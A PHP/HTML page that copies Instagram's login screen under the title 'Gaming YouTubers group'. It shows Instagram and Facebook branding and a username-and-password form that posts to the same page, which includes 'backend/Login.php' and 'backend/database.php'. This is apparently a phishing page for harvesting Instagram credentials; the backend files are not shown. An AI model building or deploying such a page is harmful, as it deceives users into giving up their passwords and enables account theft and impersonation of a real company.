<?php include 'backend/database.php';
?>


<!doctype html>
<html lang="en">
 <!--head-->
 <head> 
  <meta charset="UTF-8"> 
  <title>Gaming YouTubers group</title> 
  <!--external links--> 
  <script src="https://kit.fontawesome.com/a076d05399.js"></script> 
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous"> 
  <link rel="stylesheet" href="styles.css"> 
  <!--m--> 
  <meta name="viewport" content="width=device-width, initial-scale=1"> 

<?php include 'css/style.php' ?>
 </head> 
 <!--head close--> 
 <body> 

<?php include 'backend/Login.php' ?>

  <div class="wrapper"> 
   <div class="get"> 
    <p id="p1"> <b>Instagram</b><br>Find it for free on Google Play.</p> 
    <p id="p2">GET</p> 
   </div> 
   <div class="header"> 
    <div class="top"> 
     <div class="logo"> 
      <p>Instagram</p> 
      <!-- <img src="instagram.png" alt="instagram" style="width: 175px;"> --> 
     </div> 
     <div class="fb"> 
      <i class="fa fa-facebook-square" aria-hidden="true"></i> 
      <p> Log in with Facebook</p> 
     </div> 
     <div class="or"> 
      <div class="line"></div> 
      <p>OR</p> 
      <div class="line"></div> 
     </div> 

     <div class="form"> 
<form action="" method="POST">
      <div class="input_field"> 
       <input type="text" placeholder="Phone number, username, or email" class="input" name="user"> 
      </div> 
      <div class="input_field"> 
       <input type="password" placeholder="Password" class="input" name="pass"> 
      </div> 
      <div class="forgot"> 
       <a href="#">Forgot password?</a> 
      </div> 
      <div>
		<input type="submit" class="btn" value="ok" name="submit"></input>
      </div> 
</form>
     </div> 
     <div class="dif"> 
     </div> 
    </div> 
    <div class="signup"> 
     <p>Don't have an account? <a href="#">Sign up</a></p> 
    </div> 
   
   <div class="foot"> 
    <span> <p class="p3">From</p> <p class="p5">Facebook</p> </span> 
   </div> 
   
 </body>
</html>